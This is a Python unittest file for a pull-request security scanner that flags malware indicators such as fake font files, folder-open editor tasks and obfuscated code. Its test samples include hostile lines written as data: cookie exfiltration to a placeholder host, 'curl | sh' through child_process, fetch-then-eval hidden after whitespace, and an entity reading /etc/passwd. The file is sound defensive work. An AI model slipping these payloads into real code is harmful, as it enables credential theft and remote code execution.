"""Tests for scan_diff.py. Run with: python3 -m unittest discover -s scripts/security

Every check has at least one harmless sample that must be caught and one
ordinary file that must pass. The samples are built in a throwaway Git
repository; nothing here is executed.
"""

from __future__ import annotations

import json
import os
import subprocess
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import scan_diff  # noqa: E402

ALLOWLIST = ["**/public/**", "assets/**"]


class Repo:
    """A temporary Git repository with a base commit and a head commit."""

    def __init__(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.path = self.tmp.name
        self.git("init", "-q", "-b", "main")
        self.git("config", "user.email", "test@example.invalid")
        self.git("config", "user.name", "test")
        self.git("config", "commit.gpgsign", "false")
        self.write("README.md", "base\n")
        self.commit("base")
        self.base = self.rev()

    def git(self, *args: str) -> str:
        return subprocess.run(["git", "-C", self.path, *args], check=True, capture_output=True, text=True, env=scan_diff.git_env()).stdout

    def write(self, rel: str, content: str | bytes) -> None:
        full = os.path.join(self.path, rel)
        os.makedirs(os.path.dirname(full), exist_ok=True)
        mode = "wb" if isinstance(content, bytes) else "w"
        with open(full, mode, **({} if isinstance(content, bytes) else {"encoding": "utf-8"})) as f:
            f.write(content)

    def symlink(self, target: str, rel: str) -> None:
        os.symlink(target, os.path.join(self.path, rel))

    def commit(self, msg: str) -> None:
        self.git("add", "-A")
        self.git("commit", "-q", "--allow-empty", "-m", msg)

    def rev(self) -> str:
        return self.git("rev-parse", "HEAD").strip()

    def scan(self, association: str = "NONE") -> list[scan_diff.Finding]:
        self.commit("head")
        return scan_diff.scan(self.path, self.base, self.rev(), association, ALLOWLIST)

    def close(self) -> None:
        self.tmp.cleanup()


class GitEnvironmentTest(unittest.TestCase):
    """Git hooks export GIT_DIR and friends. Under a pre-push hook those
    variables used to send the sample repository's commits into the real one."""

    def test_samples_never_touch_the_callers_repository(self) -> None:
        clean = scan_diff.git_env()
        decoy = tempfile.TemporaryDirectory()
        subprocess.run(["git", "init", "-q", decoy.name], check=True, env=clean)
        subprocess.run(["git", "-C", decoy.name, "-c", "user.name=d", "-c", "user.email=d@example.invalid", "-c", "commit.gpgsign=false", "commit", "-q", "--allow-empty", "-m", "decoy"], check=True, env=clean)
        before = subprocess.run(["git", "-C", decoy.name, "rev-parse", "HEAD"], check=True, capture_output=True, text=True, env=clean).stdout
        saved = {k: os.environ.get(k) for k in ("GIT_DIR", "GIT_INDEX_FILE")}
        os.environ["GIT_DIR"] = os.path.join(decoy.name, ".git")
        os.environ["GIT_INDEX_FILE"] = os.path.join(decoy.name, ".git", "index")
        try:
            repo = Repo()
            repo.write("src/a.ts", "export const a = 1;\n")
            repo.scan()
            repo.close()
        finally:
            for k, v in saved.items():
                if v is None:
                    os.environ.pop(k, None)
                else:
                    os.environ[k] = v
        after = subprocess.run(["git", "-C", decoy.name, "rev-parse", "HEAD"], check=True, capture_output=True, text=True, env=clean).stdout
        config = subprocess.run(["git", "-C", decoy.name, "config", "--local", "--list"], check=True, capture_output=True, text=True, env=clean).stdout
        decoy.cleanup()
        self.assertEqual(before, after, "the sample repository committed into the caller's repository")
        self.assertNotIn("user.name=test", config)


class ScanTest(unittest.TestCase):
    def setUp(self) -> None:
        self.repo = Repo()

    def tearDown(self) -> None:
        self.repo.close()

    def checks(self, association: str = "NONE") -> set[str]:
        return {f.check for f in self.repo.scan(association)}

    # -- clean pull request ------------------------------------------------

    def test_ordinary_change_passes(self) -> None:
        self.repo.write("src/index.ts", "export const add = (a: number, b: number) => a + b;\n")
        self.repo.write("docs/guide.md", "Build it with `pnpm build`. Emoji are fine: \U0001F468\u200D\U0001F4BB\n")
        self.repo.write("public/logo.png", b"\x89PNG\r\n\x1a\n" + b"\x00" * 32)
        self.assertEqual(self.repo.scan(), [])

    # -- binaries ----------------------------------------------------------

    def test_elf_is_rejected(self) -> None:
        self.repo.write("tools/helper", b"\x7fELF\x02\x01\x01" + b"\x00" * 64)
        self.assertEqual(self.checks(), {"binary"})

    def test_pe_is_rejected(self) -> None:
        header = bytearray(b"MZ" + b"\x00" * 0x3E)
        header[0x3C:0x40] = (0x40).to_bytes(4, "little")
        self.repo.write("bin/setup.dll", bytes(header) + b"PE\x00\x00" + b"\x00" * 16)
        self.assertEqual(self.checks(), {"binary"})

    def test_text_starting_with_mz_is_not_pe(self) -> None:
        self.repo.write("notes/mz.txt", "MZ is just two letters here, and this file is long enough to have an e_lfanew slot.\n")
        self.assertEqual(self.repo.scan(), [])

    def test_zip_and_wasm_are_rejected_even_in_asset_folders(self) -> None:
        self.repo.write("public/bundle.zip", b"PK\x03\x04" + b"\x00" * 32)
        self.repo.write("assets/mod.wasm", b"\x00asm\x01\x00\x00\x00")
        findings = self.repo.scan()
        self.assertEqual({f.path for f in findings}, {"public/bundle.zip", "assets/mod.wasm"})

    def test_image_outside_allowlist_is_rejected(self) -> None:
        self.repo.write("src/payload.png", b"\x89PNG\r\n\x1a\n" + b"\x00" * 32)
        self.assertEqual(self.checks(), {"binary"})

    def test_unknown_binary_is_rejected(self) -> None:
        self.repo.write("data/blob.bin", b"\x00\x01\x02\x03\xff\xfe")
        self.assertEqual(self.checks(), {"binary"})

    # -- links -------------------------------------------------------------

    def test_symlink_is_rejected(self) -> None:
        self.repo.symlink("/home/runner/.ssh/id_rsa", "key")
        self.assertEqual(self.checks(), {"link"})

    # -- hidden Unicode ----------------------------------------------------

    def test_bidi_control_is_rejected(self) -> None:
        self.repo.write("src/auth.ts", "const isAdmin = false; /* \u202e } \u2066if (isAdmin)\u2069 \u2066 begin admins only */\n")
        self.assertEqual(self.checks(), {"hidden-unicode"})

    def test_zero_width_space_in_identifier_is_rejected(self) -> None:
        self.repo.write("src/a.ts", "const tok\u200ben = 1;\n")
        self.assertEqual(self.checks(), {"hidden-unicode"})

    def test_zero_width_joiner_in_code_is_rejected(self) -> None:
        self.repo.write("src/a.ts", "const a = '\U0001F468\u200D\U0001F4BB';\n")
        self.assertEqual(self.checks(), {"hidden-unicode"})

    def test_tag_characters_are_rejected(self) -> None:
        self.repo.write("AGENTS.md", "Follow the rules.\U000E0049\U000E0067\U000E006E\n")
        self.assertEqual(self.checks(), {"hidden-unicode"})

    def test_only_added_lines_are_checked(self) -> None:
        self.repo.write("old.ts", "const a\u200b = 1;\n")
        self.repo.commit("existing problem")
        self.repo.base = self.repo.rev()
        self.repo.write("old.ts", "const a\u200b = 1;\nconst b = 2;\n")
        self.assertEqual(self.repo.scan(), [])

    # -- SVG ---------------------------------------------------------------

    CLEAN_SVG = (
        '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 10 10">\n'
        '  <defs><linearGradient id="g"><stop offset="0" stop-color="#000"/></linearGradient></defs>\n'
        '  <path d="M0 0L10 10Z" fill="url(#g)"/><use href="#g"/>\n'
        "</svg>\n"
    )

    def test_clean_svg_passes(self) -> None:
        self.repo.write("public/logo.svg", self.CLEAN_SVG)
        self.assertEqual(self.repo.scan(), [])

    def assert_svg_rejected(self, body: str) -> None:
        self.repo.write("public/logo.svg", f'<svg xmlns="http://www.w3.org/2000/svg">\n{body}\n</svg>\n')
        self.assertEqual(self.checks(), {"svg"}, body)

    def test_svg_script_is_rejected(self) -> None:
        self.assert_svg_rejected("<script>fetch('https://example.invalid/'+document.cookie)</script>")

    def test_svg_event_handler_is_rejected(self) -> None:
        self.assert_svg_rejected('<rect width="1" height="1" onload="alert(1)"/>')

    def test_svg_javascript_url_is_rejected(self) -> None:
        self.assert_svg_rejected('<a href="javascript:alert(1)"><text>x</text></a>')

    def test_svg_foreign_object_is_rejected(self) -> None:
        self.assert_svg_rejected('<foreignObject width="10" height="10"><div>hi</div></foreignObject>')

    def test_svg_external_reference_is_rejected(self) -> None:
        self.assert_svg_rejected('<image href="https://example.invalid/track.png"/>')

    def test_svg_data_uri_is_rejected(self) -> None:
        self.assert_svg_rejected('<use href="data:image/svg+xml;base64,PHN2Zz4="/>')

    def test_svg_external_css_is_rejected(self) -> None:
        self.assert_svg_rejected("<style>@import 'https://example.invalid/x.css';</style>")

    def test_svg_entity_is_rejected(self) -> None:
        self.repo.write("public/x.svg", '<!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]>\n<svg xmlns="http://www.w3.org/2000/svg">&x;</svg>\n')
        self.assertEqual(self.checks(), {"svg"})

    # -- lockfiles and dependencies ----------------------------------------

    def test_pnpm_registry_entries_pass(self) -> None:
        self.repo.write("pnpm-lock.yaml", "packages:\n  zod@4.0.0:\n    resolution: {integrity: sha512-abc}\n")
        self.assertEqual(self.repo.scan(), [])

    def test_pnpm_tarball_is_rejected(self) -> None:
        self.repo.write("pnpm-lock.yaml", "packages:\n  evil@1.0.0:\n    resolution: {tarball: https://example.invalid/evil.tgz}\n")
        self.assertEqual(self.checks(), {"lockfile"})

    def test_pnpm_git_is_rejected(self) -> None:
        self.repo.write("pnpm-lock.yaml", "packages:\n  evil@git+https://github.com/x/y:\n    resolution: {type: git, repo: https://github.com/x/y, commit: abc}\n")
        self.assertEqual(self.checks(), {"lockfile"})

    def test_package_lock_outside_registry_is_rejected(self) -> None:
        lock = {"lockfileVersion": 3, "packages": {"": {}, "node_modules/evil": {"resolved": "https://example.invalid/evil.tgz", "integrity": "sha512-x"}}}
        self.repo.write("package-lock.json", json.dumps(lock))
        self.assertEqual(self.checks(), {"lockfile"})

    def test_cargo_git_source_is_rejected(self) -> None:
        self.repo.write("Cargo.lock", '[[package]]\nname = "evil"\nsource = "git+https://github.com/x/evil#abc"\n')
        self.assertEqual(self.checks(), {"lockfile"})

    def test_cargo_crates_io_passes(self) -> None:
        self.repo.write("Cargo.lock", '[[package]]\nname = "serde"\nsource = "registry+https://github.com/rust-lang/crates.io-index"\n')
        self.assertEqual(self.repo.scan(), [])

    def test_cargo_toml_git_dependency_is_rejected(self) -> None:
        self.repo.write("Cargo.toml", '[dependencies]\nevil = { git = "https://github.com/x/evil" }\n')
        self.assertEqual(self.checks(), {"dependency"})

    def test_go_replace_is_rejected(self) -> None:
        self.repo.write("go.mod", "module x\n\ngo 1.25\n\nreplace github.com/a/b => ../b\n")
        self.assertEqual(self.checks(), {"lockfile"})

    def test_package_json_git_dependency_is_rejected(self) -> None:
        self.repo.write("package.json", json.dumps({"dependencies": {"evil": "github:x/evil", "ok": "^1.0.0", "local": "workspace:*"}}))
        self.assertEqual(self.checks(), {"dependency"})

    def test_npmrc_registry_override_is_rejected(self) -> None:
        self.repo.write(".npmrc", "registry=https://npm.example.invalid/\n")
        self.assertEqual(self.checks(), {"dependency"})

    # -- lifecycle scripts -------------------------------------------------

    def test_new_postinstall_from_outside_contributor_is_rejected(self) -> None:
        self.repo.write("package.json", json.dumps({"name": "x", "scripts": {"postinstall": "node setup.js"}}))
        self.assertEqual(self.checks("CONTRIBUTOR"), {"lifecycle"})

    def test_new_postinstall_from_member_passes(self) -> None:
        self.repo.write("package.json", json.dumps({"name": "x", "scripts": {"postinstall": "lefthook install"}}))
        self.assertEqual(self.repo.scan("MEMBER"), [])

    def test_new_postinstall_from_maintainer_role_passes(self) -> None:
        self.repo.write("package.json", json.dumps({"name": "x", "scripts": {"postinstall": "lefthook install"}}))
        self.repo.commit("head")
        found = scan_diff.scan(self.repo.path, self.repo.base, self.repo.rev(), "CONTRIBUTOR", ALLOWLIST, author_role="admin")
        self.assertEqual(found, [])

    def test_new_postinstall_from_write_role_is_rejected(self) -> None:
        self.repo.write("package.json", json.dumps({"name": "x", "scripts": {"postinstall": "node x.js"}}))
        self.repo.commit("head")
        found = scan_diff.scan(self.repo.path, self.repo.base, self.repo.rev(), "CONTRIBUTOR", ALLOWLIST, author_role="write")
        self.assertEqual({f.check for f in found}, {"lifecycle"})

    def test_unchanged_prepare_passes(self) -> None:
        self.repo.write("package.json", json.dumps({"name": "x", "scripts": {"prepare": "lefthook install"}}))
        self.repo.commit("existing")
        self.repo.base = self.repo.rev()
        self.repo.write("package.json", json.dumps({"name": "x", "scripts": {"prepare": "lefthook install", "test": "vitest"}}))
        self.assertEqual(self.repo.scan("NONE"), [])

    # -- obfuscation -------------------------------------------------------

    def test_long_line_is_rejected(self) -> None:
        self.repo.write("src/min.js", "var a=" + "1+" * 600 + "1;\n")
        self.assertEqual(self.checks(), {"obfuscation"})

    def test_base64_blob_is_rejected(self) -> None:
        self.repo.write("src/x.ts", "const p =\n  '" + "QUJD" * 600 + "';\n")
        self.assertEqual(self.checks(), {"obfuscation"})

    def test_escape_heavy_file_is_rejected(self) -> None:
        self.repo.write("src/x.js", "const s = '" + "\\x65\\x76\\x61\\x6c" * 30 + "';\n")
        self.assertEqual(self.checks(), {"obfuscation"})

    def test_oversized_source_file_is_rejected(self) -> None:
        self.repo.write("src/padded.js", "// pad\n" * 80000 + "run();\n")
        self.assertEqual(self.checks(), {"obfuscation"})

    def test_long_svg_path_data_passes(self) -> None:
        self.repo.write("src/Logo.tsx", '<path d="' + "M1.5 2.5Q3 4 5 6" * 200 + '" fill="currentColor"/>\n')
        self.assertEqual(self.repo.scan(), [])

    def test_long_markdown_paragraph_passes(self) -> None:
        self.repo.write("docs/long.md", "word " * 400 + "\n")
        self.assertEqual(self.repo.scan(), [])


class WaveIndicatorTest(unittest.TestCase):
    """The indicators Drips reported after Wave 10. Each one fails no matter
    who wrote the pull request or who approved it
    (ADR-2026-11-18-wave-malware-indicators)."""

    def setUp(self) -> None:
        self.repo = Repo()

    def tearDown(self) -> None:
        self.repo.close()

    def checks(self, association: str = "NONE") -> set[str]:
        return {f.check for f in self.repo.scan(association)}

    # -- 1. editor auto-run ------------------------------------------------

    def test_folder_open_task_is_rejected(self) -> None:
        tasks = {"version": "2.0.0", "tasks": [{"label": "setup", "type": "shell", "command": "node .vscode/x.js", "runOptions": {"runOn": "folderOpen"}}]}
        self.repo.write(".vscode/tasks.json", json.dumps(tasks, indent=2))
        self.assertEqual(self.checks(), {"autorun"})

    def test_folder_open_task_hidden_in_jsonc_is_rejected(self) -> None:
        self.repo.write(".vscode/tasks.json", '// shared tasks\n{ "tasks": [ { "label": "a", "runOptions": { "runOn" : "folderOpen" } }, ] }\n')
        self.assertEqual(self.checks("MEMBER"), {"autorun"})

    def test_folder_open_spelled_with_unicode_escapes_is_rejected(self) -> None:
        self.repo.write(".vscode/tasks.json", '{ "tasks": [ { "runOptions": { "run\\u004fn": "folder\\u004fpen" } } ] }\n')
        self.repo.write(".vscode/settings.json", '{ "task.allowAutomatic\\u0054asks": "on" }\n')
        self.assertEqual(self.checks(), {"autorun"})

    def test_ordinary_tasks_pass(self) -> None:
        tasks = {"version": "2.0.0", "tasks": [{"label": "test", "type": "shell", "command": "pnpm test"}]}
        self.repo.write(".vscode/tasks.json", json.dumps(tasks, indent=2))
        self.assertEqual(self.repo.scan(), [])

    def test_automatic_tasks_setting_is_rejected(self) -> None:
        self.repo.write(".vscode/settings.json", '{ "editor.tabSize": 2, "task.allowAutomaticTasks": "on" }\n')
        self.assertEqual(self.checks(), {"autorun"})

    def test_automatic_tasks_in_workspace_file_is_rejected(self) -> None:
        self.repo.write("tollway.code-workspace", '{ "settings": { "task.allowAutomaticTasks": "on" } }\n')
        self.assertEqual(self.checks(), {"autorun"})

    def test_automatic_tasks_off_passes(self) -> None:
        self.repo.write(".vscode/settings.json", '{ "task.allowAutomaticTasks": "off" }\n')
        self.assertEqual(self.repo.scan(), [])

    def test_folder_open_in_docs_passes(self) -> None:
        self.repo.write("docs/security.md", 'Never accept a task with `"runOn": "folderOpen"`.\n')
        self.assertEqual(self.repo.scan(), [])

    # -- 2. fake assets ----------------------------------------------------

    def test_text_file_named_as_font_is_rejected(self) -> None:
        self.repo.write("public/fonts/icons.woff2", "const p = require('child_process'); p.exec('curl x | sh');\n")
        self.assertEqual(self.checks(), {"fake-asset"})

    def test_text_file_named_as_image_is_rejected(self) -> None:
        self.repo.write("public/logo.png", "eval(atob('aGVsbG8='))\n")
        self.assertEqual(self.checks(), {"fake-asset"})

    def test_font_with_wrong_magic_is_rejected(self) -> None:
        self.repo.write("public/fonts/icons.ttf", b"\x89PNG\r\n\x1a\n" + b"\x00" * 32)
        self.assertEqual(self.checks(), {"fake-asset"})

    def test_known_malicious_font_names_are_rejected(self) -> None:
        self.repo.write("public/fonts/fa-solid-500.woff2", b"wOF2" + b"\x00" * 64)
        self.repo.write("assets/fa-solid-300.ttf", b"\x00\x01\x00\x00" + b"\x00" * 64)
        findings = self.repo.scan()
        self.assertEqual({f.check for f in findings}, {"fake-asset"})
        self.assertEqual({f.path for f in findings}, {"public/fonts/fa-solid-500.woff2", "assets/fa-solid-300.ttf"})

    def test_lik_file_is_rejected(self) -> None:
        self.repo.write("public/fonts/fa-solid.lik", "anything\n")
        self.assertEqual(self.checks(), {"fake-asset"})

    def test_real_font_and_image_pass(self) -> None:
        self.repo.write("public/fonts/inter.woff2", b"wOF2" + b"\x00" * 64)
        self.repo.write("public/fonts/inter.ttf", b"\x00\x01\x00\x00" + b"\x00" * 64)
        self.repo.write("public/logo.png", b"\x89PNG\r\n\x1a\n" + b"\x00" * 32)
        self.assertEqual(self.repo.scan(), [])

    # -- 3. committed build output -----------------------------------------

    def test_dist_setup_js_is_rejected(self) -> None:
        self.repo.write("dist/setup.js", "module.exports = 1;\n")
        self.assertEqual(self.checks("MEMBER"), {"build-output"})

    def test_nested_build_output_is_rejected(self) -> None:
        self.repo.write("packages/core/dist/index.js", "export {};\n")
        self.repo.write("apps/web/build/server.js", "export {};\n")
        findings = self.repo.scan()
        self.assertEqual({f.check for f in findings}, {"build-output"})
        self.assertEqual(len(findings), 2)

    def test_names_that_only_contain_dist_pass(self) -> None:
        self.repo.write("src/distance.ts", "export const d = 1;\n")
        self.repo.write("docs/distribution/notes.md", "fine\n")
        self.assertEqual(self.repo.scan(), [])

    # -- 4. scripts that run a loose file ----------------------------------

    def test_dev_script_running_api_js_is_rejected(self) -> None:
        self.repo.write("package.json", json.dumps({"name": "x", "scripts": {"dev": "node api.js && next dev"}}))
        self.assertEqual(self.checks("MEMBER"), {"loose-script"})

    def test_start_script_running_dist_setup_is_rejected(self) -> None:
        self.repo.write("package.json", json.dumps({"name": "x", "scripts": {"start": "node ./dist/setup.js"}}))
        self.assertEqual(self.checks("MEMBER"), {"loose-script"})

    def test_scripts_using_tools_or_the_scripts_folder_pass(self) -> None:
        scripts = {"dev": "next dev", "build": "tsup", "test": "vitest run", "start": "node scripts/serve.mjs"}
        self.repo.write("package.json", json.dumps({"name": "x", "scripts": scripts}))
        self.assertEqual(self.repo.scan(), [])

    # -- 5. code hidden after a long run of whitespace ---------------------

    def test_code_after_long_whitespace_in_config_is_rejected(self) -> None:
        self.repo.write("eslint.config.mjs", "export default [];" + " " * 200 + "import('node:child_process').then((c) => c.exec('id'));\n")
        self.assertEqual(self.checks("MEMBER"), {"hidden-code"})

    def test_code_after_tabs_in_json_is_rejected(self) -> None:
        self.repo.write("tsconfig.json", '{ "compilerOptions": {} }' + "\t" * 80 + '"x"\n')
        self.assertEqual(self.checks(), {"hidden-code"})

    def test_code_far_to_the_right_on_its_own_line_is_rejected(self) -> None:
        self.repo.write("vite.config.ts", "export default {};\n" + " " * 150 + "fetch('https://example.invalid/p').then(eval);\n")
        self.assertEqual(self.checks(), {"hidden-code"})

    def test_padded_markdown_table_passes(self) -> None:
        self.repo.write("docs/rules.md", "| Rule | What |\n| ---- | ---- |\n| a    |" + " " * 120 + "|\n")
        self.assertEqual(self.repo.scan(), [])

    def test_ordinary_indentation_passes(self) -> None:
        self.repo.write("src/deep.ts", "export const x = {\n" + "  " * 20 + "y: 1,\n};\n")
        self.assertEqual(self.repo.scan(), [])

    # -- 6. known markers --------------------------------------------------

    def test_known_markers_are_rejected_anywhere(self) -> None:
        self.repo.write("src/a.ts", "const k = 'rmcej%otb%';\n")
        self.repo.write("docs/b.md", "Cot%3T=sthP\n")
        self.repo.write("next.config.js", "var _$__1e42 = 1;\n")
        findings = self.repo.scan("MEMBER")
        self.assertEqual({f.check for f in findings}, {"marker"})
        self.assertEqual(len(findings), 3)


if __name__ == "__main__":
    unittest.main()
